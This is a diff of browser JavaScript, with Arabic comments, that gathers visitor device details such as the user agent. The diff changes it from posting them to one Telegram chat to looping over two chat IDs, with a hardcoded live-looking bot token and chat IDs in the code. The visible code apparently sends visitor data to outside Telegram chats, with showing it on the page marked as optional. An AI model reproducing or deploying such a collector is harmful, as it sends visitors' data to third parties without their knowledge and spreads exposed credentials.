@@ -13,24 +13,30 @@ User-Agent:
 ${navigator.userAgent}
   `;
 
-  // Replace with your bot token and chat ID
+  // توكن البوت
   const botToken = "7606461880:AAGtzFYAcUjppyIsKKaEyqOGRBj1mWFbXeQ";
-  const chatId = "2071334805";
 
-  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: deviceInfo
-    })
-  }).then(response => {
-    console.log("Sent to Telegram");
-  }).catch(error => {
-    console.error("Error sending to Telegram:", error);
+  // حط هنا كل الـ IDs اللي تريد تبعثلهم
+  const chatIds = ["1443115693", "2071334805"]; // <-- غيّر الثاني ID حسب الحاجة
+
+  // حلقة ترسل الرسالة لكل ID
+  chatIds.forEach(chatId => {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: deviceInfo
+      })
+    }).then(response => {
+      console.log(`✅ Sent to Telegram ID: ${chatId}`);
+    }).catch(error => {
+      console.error(`❌ Error sending to ${chatId}:`, error);
+    });
   });
 
+  // طباعة النتيجة على الصفحة (اختياري)
   document.getElementById("output").textContent = deviceInfo;
 });
